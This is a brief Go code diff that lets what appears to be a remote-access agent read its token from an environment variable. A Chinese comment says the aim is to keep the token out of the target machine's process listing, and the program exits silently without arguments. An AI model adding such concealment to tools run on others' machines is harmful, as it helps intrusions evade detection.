@@ -748,6 +748,10 @@ func handleConn(ln msgLink) {
 
 func main() {
 	flag.Parse()
+	// token 可走环境变量：避免出现在目标机的进程 cmdline 里（ps/proc 可见）
+	if *token == "" {
+		*token = os.Getenv("RTX_TOKEN")
+	}
 	flag.Usage = func() {} // 静默帮助
 	if *serverAddr == "" || *token == "" {
 		os.Exit(1)
